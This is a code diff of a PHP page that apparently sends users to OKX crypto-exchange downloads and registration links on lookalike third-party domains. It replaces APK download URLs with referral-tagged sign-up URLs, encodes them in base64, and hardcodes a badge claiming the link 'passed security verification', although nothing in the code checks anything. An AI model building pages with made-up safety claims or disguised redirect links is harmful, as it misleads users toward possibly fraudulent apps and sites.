@@ -1,9 +1,8 @@
 <?php
-$primaryUrl = 'https://download.ouyi.win/okx-android_ACE529253.apk'; // 主用下载
-$backupUrl1 = 'https://static.glgle.cn/upgradeapp/okx-android_ACE529253.apk'; // 备用下载1
-$backupUrl2 = 'https://ouyi.win/okx-android_ACE529253.apk'; // 备用下载2
+$primaryUrl = 'https://www.ouydl.me/ul/Q7tTR4?channelId=ACE529253'; // 主用下载
+$backupUrl1 = 'https://www.ouchyi.co/zh-hans/join?shortCode=Q7tTR4&channelId=ACE529253'; // 备用下载1
+$backupUrl2 = 'https://www.ouzhyi.co/zh-hans/join?channelId=ACE529253'; // 备用下载2
 
-// 加密处理
 $encryptedPrimary = base64_encode($primaryUrl);
 $encryptedBackup1 = base64_encode($backupUrl1);
 $encryptedBackup2 = base64_encode($backupUrl2);
@@ -148,35 +147,35 @@ $encryptedBackup2 = base64_encode($backupUrl2);
   </style>
 </head>
 <body>
-  <div class="container">
+    <div class="container">
     <div class="security-badge">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
         <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z" clip-rule="evenodd" />
       </svg>
-      <?= htmlspecialchars($lang_data['safelink']) ?>
+      链接已安全验证
     </div>
     
-    <h1><?= htmlspecialchars($lang_data['safelink1']) ?></h1>
-    <p><?= htmlspecialchars($lang_data['safelink2']) ?></p>
+    <h1>链接已通过安全验证</h1>
+    <p>系统已自动为您选择最优注册通道</p>
     
     <div class="btn-group">
       <button class="btn btn-primary" onclick="startDownload(event, 'primary')">
-        <?= htmlspecialchars($lang_data['safelink3']) ?>
+       主要注册入口
         <span class="loader" id="loader1"></span>
       </button>
       
       <button class="btn btn-secondary" onclick="startDownload(event, 'backup1')">
-        <?= htmlspecialchars($lang_data['safelink4']) ?> Ⅰ
+      备用注册地址 Ⅰ
         <span class="loader" id="loader2"></span>
       </button>
       
       <button class="btn btn-tertiary" onclick="startDownload(event, 'backup2')">
-        <?= htmlspecialchars($lang_data['safelink4']) ?> Ⅱ
+         备用注册地址 Ⅱ
         <span class="loader" id="loader3"></span>
       </button>
     </div>
     
-    <p class="notice"><?= htmlspecialchars($lang_data['safelink5']) ?></p>
+    <p class="notice">如果主通道无法进入，请尝试备用通道</p>
   </div>
 
   <script>
